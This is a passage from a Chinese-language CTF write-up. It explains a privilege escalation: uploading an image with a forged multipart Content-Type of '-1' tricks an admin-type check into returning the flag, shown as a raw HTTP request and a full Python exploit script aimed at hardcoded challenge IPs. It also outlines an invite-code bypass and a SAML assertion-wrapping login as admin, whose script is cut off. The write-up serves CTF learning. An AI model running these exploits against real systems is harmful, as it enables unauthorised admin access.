</span></span></code></pre></td></tr></table></div></div><p>图片校验函数 <code>isValidImage</code> 并不校验或规范化客户端提交的 <code>Content-Type</code>，它仅验证扩展名、大小以及 <code>getimagesize</code> 是否能读出基本信息。因此我们既可以上传一张合法的 PNG/JPG 文件来满足这些检查，又可以在分段头将 <code>Content-Type</code> 写成任意字符串（例如 <code>-1</code>）。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=c1>// framework/helpers.php
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>isValidImage</span><span class=p>(</span><span class=nv>$file</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$allowedExtensions</span> <span class=o>=</span> <span class=nx>config</span><span class=p>(</span><span class=s1>&#39;upload.allowed_extensions&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ext</span> <span class=o>=</span> <span class=nx>strtolower</span><span class=p>(</span><span class=nx>pathinfo</span><span class=p>(</span><span class=nv>$file</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>],</span> <span class=nx>PATHINFO_EXTENSION</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$ext</span><span class=p>,</span> <span class=nv>$allowedExtensions</span><span class=p>))</span> <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$file</span><span class=p>[</span><span class=s1>&#39;size&#39;</span><span class=p>]</span> <span class=o>&gt;</span> <span class=nx>config</span><span class=p>(</span><span class=s1>&#39;upload.max_size&#39;</span><span class=p>))</span> <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$imageInfo</span> <span class=o>=</span> <span class=o>@</span><span class=nx>getimagesize</span><span class=p>(</span><span class=nv>$file</span><span class=p>[</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$imageInfo</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>所以思路清晰了，首先在 <code>/register</code> 完成正常注册登录，随后构造原始 <code>multipart/form-data</code> 请求体，将文件分段头设为 <code>Content-Type: -1</code> 上传一张满足扩展名和 <code>getimagesize</code> 的合法图片，得到这张图片的 <code>photo_id</code>。然后调用 <code>/api/user/background</code> 将其设为当前用户的背景图。此时再访问 <code>superadmin.php</code>，由于 <code>Auth::type()</code> 读取的是 <code>photo.type</code> 且它是 <code>-1</code>，满足 <code>&lt; admin(0)</code>，服务器就会返回 <code>FLAG</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTTP data-lang=HTTP><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api/photos/upload</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=----X</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------X
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;photos[]&#34;; filename=&#34;x.png&#34;
</span></span><span class=line><span class=cl>Content-Type: -1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PNG_BYTES...
</span></span><span class=line><span class=cl>------X--
</span></span></code></pre></td></tr></table></div></div><p>exp 如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>tempfile</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>IMG_PATH</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>abspath</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=vm>__file__</span><span class=p>),</span> <span class=s2>&#34;public/assets/img/default-avatar.png&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>BASES_DEFAULT</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;http://1.95.160.41:26000&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;http://1.95.160.41:26001&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;http://1.95.160.41:26002&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>TIMEOUT</span> <span class=o>=</span> <span class=mi>20</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=n>cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>capture_output</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>text</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=n>stdout</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_csrf_from_html</span><span class=p>(</span><span class=n>html</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;name=&#34;csrf_token&#34;\s+value=&#34;([^&#34;]+)&#34;&#39;</span><span class=p>,</span> <span class=n>html</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=k>if</span> <span class=n>m</span> <span class=k>else</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>curl_get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>cookie</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>copt</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;-b </span><span class=si>{</span><span class=n>cookie</span><span class=si>}</span><span class=s2>&#34;</span> <span class=k>if</span> <span class=n>cookie</span> <span class=k>else</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>run</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;curl -s </span><span class=si>{</span><span class=n>copt</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>curl_post_form</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>cookie</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>urlencode</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>run</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;curl -s -c </span><span class=si>{</span><span class=n>cookie</span><span class=si>}</span><span class=s2> -b </span><span class=si>{</span><span class=n>cookie</span><span class=si>}</span><span class=s2> -X POST </span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2> -d </span><span class=se>\&#34;</span><span class=si>{</span><span class=n>payload</span><span class=si>}</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_multipart_body</span><span class=p>(</span><span class=n>img_bytes</span><span class=p>,</span> <span class=n>field_name</span><span class=o>=</span><span class=s2>&#34;photos[]&#34;</span><span class=p>,</span> <span class=n>filename</span><span class=o>=</span><span class=s2>&#34;x.png&#34;</span><span class=p>,</span> <span class=n>forced_ct</span><span class=o>=</span><span class=s2>&#34;-1&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>boundary</span> <span class=o>=</span> <span class=s2>&#34;----TraeBoundary&#34;</span> <span class=o>+</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>f</span><span class=s2>&#34;--</span><span class=si>{</span><span class=n>boundary</span><span class=si>}</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=sa>f</span><span class=s1>&#39;Content-Disposition: form-data; name=&#34;</span><span class=si>{</span><span class=n>field_name</span><span class=si>}</span><span class=s1>&#34;; filename=&#34;</span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s1>&#34;</span><span class=se>\r\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>        <span class=sa>f</span><span class=s2>&#34;Content-Type: </span><span class=si>{</span><span class=n>forced_ct</span><span class=si>}</span><span class=se>\r\n\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>--</span><span class=si>{</span><span class=n>boundary</span><span class=si>}</span><span class=s2>--</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>body</span> <span class=o>=</span> <span class=n>head</span> <span class=o>+</span> <span class=n>img_bytes</span> <span class=o>+</span> <span class=n>tail</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>boundary</span><span class=p>,</span> <span class=n>body</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>curl_post_multipart</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>boundary</span><span class=p>,</span> <span class=n>body_path</span><span class=p>,</span> <span class=n>cookie</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>run</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;curl -s -b </span><span class=si>{</span><span class=n>cookie</span><span class=si>}</span><span class=s2> -H &#39;Content-Type: multipart/form-data; boundary=</span><span class=si>{</span><span class=n>boundary</span><span class=si>}</span><span class=s2>&#39; --data-binary @</span><span class=si>{</span><span class=n>body_path</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exploit_base</span><span class=p>(</span><span class=n>base</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>port</span> <span class=o>=</span> <span class=n>base</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>cookie</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;/tmp/photographer_</span><span class=si>{</span><span class=n>port</span><span class=si>}</span><span class=s2>.cookie&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_html</span> <span class=o>=</span> <span class=n>run</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;curl -s -c </span><span class=si>{</span><span class=n>cookie</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2>/register&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>csrf</span> <span class=o>=</span> <span class=n>get_csrf_from_html</span><span class=p>(</span><span class=n>reg_html</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>csrf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2> no csrf&#34;</span><span class=p>,</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>email</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;exp_</span><span class=si>{</span><span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span><span class=si>}</span><span class=s2>_</span><span class=si>{</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>1000</span><span class=p>,</span><span class=mi>9999</span><span class=p>)</span><span class=si>}</span><span class=s2>@example.com&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>curl_post_form</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2>/api/register&#34;</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;csrf_token&#34;</span><span class=p>:</span> <span class=n>csrf</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=s2>&#34;ctfuser&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;email&#34;</span><span class=p>:</span> <span class=n>email</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;pw12345&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;confirm_password&#34;</span><span class=p>:</span> <span class=s2>&#34;pw12345&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=n>cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>IMG_PATH</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>img_bytes</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>boundary</span><span class=p>,</span> <span class=n>body</span> <span class=o>=</span> <span class=n>build_multipart_body</span><span class=p>(</span><span class=n>img_bytes</span><span class=p>,</span> <span class=n>field_name</span><span class=o>=</span><span class=s2>&#34;photos[]&#34;</span><span class=p>,</span> <span class=n>filename</span><span class=o>=</span><span class=s2>&#34;x.png&#34;</span><span class=p>,</span> <span class=n>forced_ct</span><span class=o>=</span><span class=s2>&#34;-1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>body_path</span> <span class=o>=</span> <span class=n>tempfile</span><span class=o>.</span><span class=n>mktemp</span><span class=p>(</span><span class=n>prefix</span><span class=o>=</span><span class=s2>&#34;photographer_body_&#34;</span><span class=p>,</span> <span class=n>suffix</span><span class=o>=</span><span class=s2>&#34;.bin&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>body_path</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>bf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>bf</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>up_json</span> <span class=o>=</span> <span class=n>curl_post_multipart</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2>/api/photos/upload&#34;</span><span class=p>,</span> <span class=n>boundary</span><span class=p>,</span> <span class=n>body_path</span><span class=p>,</span> <span class=n>cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>up</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>up_json</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>pid</span> <span class=o>=</span> <span class=n>up</span><span class=p>[</span><span class=s2>&#34;photos&#34;</span><span class=p>][</span><span class=mi>0</span><span class=p>][</span><span class=s2>&#34;id&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2> upload parse failed&#34;</span><span class=p>,</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>settings_html</span> <span class=o>=</span> <span class=n>curl_get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2>/settings&#34;</span><span class=p>,</span> <span class=n>cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>csrf2</span> <span class=o>=</span> <span class=n>get_csrf_from_html</span><span class=p>(</span><span class=n>settings_html</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>csrf2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2> settings csrf missing&#34;</span><span class=p>,</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>curl_post_form</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2>/api/user/background&#34;</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;photo_id&#34;</span><span class=p>:</span> <span class=n>pid</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;csrf_token&#34;</span><span class=p>:</span> <span class=n>csrf2</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=n>cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=n>curl_get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2>/superadmin.php&#34;</span><span class=p>,</span> <span class=n>cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;ok&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>bases</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>:]</span> <span class=ow>or</span> <span class=n>BASES_DEFAULT</span>
</span></span><span class=line><span class=cl>    <span class=n>results</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>base</span> <span class=ow>in</span> <span class=n>bases</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>status</span><span class=p>,</span> <span class=n>flag</span> <span class=o>=</span> <span class=n>exploit_base</span><span class=p>(</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>results</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>base</span><span class=p>,</span> <span class=n>status</span><span class=p>,</span> <span class=n>flag</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>results</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>base</span><span class=p>,</span> <span class=s2>&#34;error&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>base</span><span class=p>,</span> <span class=n>status</span><span class=p>,</span> <span class=n>flag</span> <span class=ow>in</span> <span class=n>results</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>base</span><span class=si>}</span><span class=s2> -&gt; </span><span class=si>{</span><span class=n>status</span><span class=si>}</span><span class=s2> -&gt; </span><span class=si>{</span><span class=n>flag</span> <span class=ow>or</span> <span class=s1>&#39;&lt;no output&gt;&#39;</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=auth>auth</h2><ul><li>authController.register 只在 parseInt(type) === 0 时才检查邀请码，因此我用 type=0x10 绕过了这一校验（见 idp-portal/src/controllers/authController.js (line 27)）并完成了注册，但用户实际存储的 type 依然不为 0，所以 SAML 入口仍拒绝（samlController.idpInitiatedSSO/sso 均在 idp-portal/src/controllers/samlController.js (line 13) 和 (line 176) 处要求 req.session.userType === 0）。</li><li>SP/admin 只检查会话中的 email 是否等于 <a href=mailto:admin@rois.team>admin@rois.team</a>（sp-flag/app.py (line 88)），而自身的 SAML 验证足够严格；于是我写了 saml_exploit.py (line 1)，自动注册、登录、触发 IDP 发回的 SAMLResponse，串联两份 Assertion 并把其中一个的 NameID 改成 admin 后再提交给 SP，成功绕过了权限并拿到了管理员页。</li></ul><p>脚本附上</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
